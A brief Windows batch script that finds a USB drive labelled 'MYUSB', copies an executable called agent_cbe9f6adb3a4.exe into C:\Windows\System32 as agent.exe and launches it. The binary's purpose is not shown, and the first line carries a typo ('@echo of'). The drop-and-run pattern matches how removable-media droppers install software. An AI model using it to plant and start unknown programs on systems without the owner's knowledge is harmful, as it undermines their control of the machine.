@echo of

:BEGIN
cls
@echo.
@echo copy file to HDD and excute it
@echo.

for /f %%d in ('wmic volume get driveletter^, label ^| findstr "MYUSB"') do set myd=%%d
copy %myd%\agent_cbe9f6adb3a4.exe  C:\Windows\System32\agent.exe
cd C:\Windows\System32\
START agent.exe
